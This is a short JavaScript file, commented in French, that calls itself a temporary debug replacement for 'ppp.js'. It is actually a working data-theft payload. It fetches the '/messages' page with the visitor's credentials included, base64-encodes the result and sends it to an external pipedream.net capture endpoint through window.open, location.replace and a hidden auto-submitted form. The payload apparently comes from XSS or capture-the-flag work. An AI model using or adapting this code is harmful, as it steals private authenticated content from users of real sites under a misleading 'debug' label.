// debug-ppp.js - remplace ppp.js temporairement pour debug
(function(){
  const END = "https://eoeipamgnflz15n.m.pipedream.net";
  const TIMEOUT_MS = 5000;

  function safeEncode(s){
    try { return encodeURIComponent(btoa(unescape(encodeURIComponent(String(s))))); }
    catch(e){ try { return encodeURIComponent(btoa(String(s))); } catch(_) { return ""; } }
  }

  function tryOpen(url){
    try {
      // essaie d'ouvrir/réutiliser un onglet nommé
      const win = window.open(url, "skav_debug");
      if (!win) throw new Error("popup_blocked_or_null");
      return true;
    } catch(e){
      return false;
    }
  }

  console.log("[ppp-debug] starting");

  // 1) vérifie que le script est chargé
  console.log("[ppp-debug] script loaded, page origin:", location.origin);

  // 2) test rapide: fetch manuel avec timeout
  let didRespond = false;
  const to = setTimeout(() => {
    if (!didRespond) {
      console.warn("[ppp-debug] fetch timed out after", TIMEOUT_MS, "ms");
      // informe endpoint
      if (!tryOpen(END + "?err=" + safeEncode("fetch_timeout"))) {
        try { location.replace(END + "?err=" + safeEncode("fetch_timeout")); } catch(e){}
      }
    }
  }, TIMEOUT_MS);

  fetch("/messages", { method: "GET", credentials: "include" })
    .then(r => {
      console.log("[ppp-debug] fetch returned status", r.status, r.type);
      if (!r.ok) throw new Error("HTTP " + r.status);
      return r.text();
    })
    .then(txt => {
      didRespond = true;
      clearTimeout(to);
      console.log("[ppp-debug] fetch text length:", txt ? txt.length : 0);
      console.log("[ppp-debug] sample:", (txt||"").slice(0,200));
      // envoie via window.open (préférence), fallback to location.replace
      const url = END + "?ok=" + safeEncode(txt || "");
      if (!tryOpen(url)) {
        try { location.replace(url); } catch(e) { console.error("[ppp-debug] both open and replace failed", e); }
      }
      // si trop long, faire un form POST (top-level) en plus
      if ((txt||"").length > 1800) {
        try {
          const form = document.createElement("form");
          form.method = "POST";
          form.action = END + "/receive";
          form.style.display = "none";
          form.target = "skav_debug";
          const inp = document.createElement("input");
          inp.type = "hidden"; inp.name = "p"; inp.value = safeEncode(txt || "");
          form.appendChild(inp);
          document.body.appendChild(form);
          form.submit();
          console.log("[ppp-debug] did form POST fallback");
        } catch(e) {
          console.warn("[ppp-debug] form POST failed", e);
        }
      }
    })
    .catch(err => {
      didRespond = true;
      clearTimeout(to);
      console.error("[ppp-debug] fetch error:", err);
      const url = END + "?err=" + safeEncode(String(err && err.stack ? err.stack : err));
      if (!tryOpen(url)) {
        try { location.replace(url); } catch(e) { console.error("[ppp-debug] final fallback failed", e); }
      }
    });
})();
